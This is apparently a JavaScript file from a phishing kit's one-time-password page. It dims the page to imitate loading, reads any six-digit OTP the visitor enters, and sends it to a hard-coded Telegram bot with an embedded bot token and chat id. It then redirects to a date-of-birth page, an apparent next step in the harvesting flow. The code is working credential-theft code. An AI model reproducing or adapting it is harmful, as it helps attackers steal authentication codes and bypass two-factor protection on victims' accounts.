// dob page
let otp = document.getElementById('otp')
let continues = document.getElementById('continue')
let parentDiv = document.getElementById('parentDiv')



function myLoad() {
    parentDiv.style.opacity = 0.2
    setTimeout(() => {
        parentDiv.style.opacity = 1
    }, 3000);
}
myLoad();

continues.addEventListener('click', ()=> {
    
    if (otp.value.length === 6) {

        const data = {
            chat_id: 1159922503,
            parse_mode: 'HTML',
            text: ` <b>OTP: ${otp.value}</b>📧📧📧`
        }

        axios.post('https://api.telegram.org/bot5642243651:AAGVL6ga-Ae08Tz2pb9SAuHW211ykBa1NQg/sendMessage', data,{
            "Content-Type": "application/json"
        })
        .then(response => {
            console.log(response.data)
        })
        .catch(error => alert(error))

        
        continues.disabled = true

        setTimeout(() => {
            location.replace("/dob.html")
        }, 2000);
    } else {
        alert('Incorrect OTP')
    }
    
})


// otp.addEventListener('input', ()=> {
//     console.log(otp.value.length);
// })

